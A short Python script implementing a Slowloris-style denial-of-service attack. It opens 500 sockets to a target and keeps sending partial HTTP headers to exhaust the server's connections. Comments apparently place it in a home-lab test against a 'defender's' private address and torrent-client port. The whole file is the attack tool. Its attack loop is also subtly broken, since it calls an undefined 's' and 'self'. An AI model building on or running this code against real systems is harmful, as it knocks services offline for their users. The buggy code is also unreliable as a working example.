import sys, random, time, socket

class dosTest():
    def __init__(dos, ip, port, sc):
        dos._ip = ip
        dos._port = port
        dos._headers = []
        dos._sockets = [dos.newSocket() for _ in range(sc)]

    def getMessage(dos, message):
        return (message + "{}".format(str(random.randint(0, 1000)))).encode("utf-8")

    def newSocket(dos):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((dos._ip, dos._port))
            s.send(dos.getMessage("Get /?"))
            for header in dos._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.1)
            return dos.newSocket()

    def attack(dos, timeout=sys.maxsize, sleep = 10):
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for d in dos._sockets:
                try:
                    print("Sending Request: #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    dos._sockets.remove(d)
                    dos._sockets.append(dos.newSocket())
                time.sleep(sleep/len(dos._sockets))


if __name__ == "__main__":
    dost = dosTest("192.168.219.102", 46826, 500)
    #this is defender's IP and open port number from torrent client.
    #also tested with port number 80 to see if the timeout error is actually working.(it worked)
    dost.attack(timeout = 60 * 10)
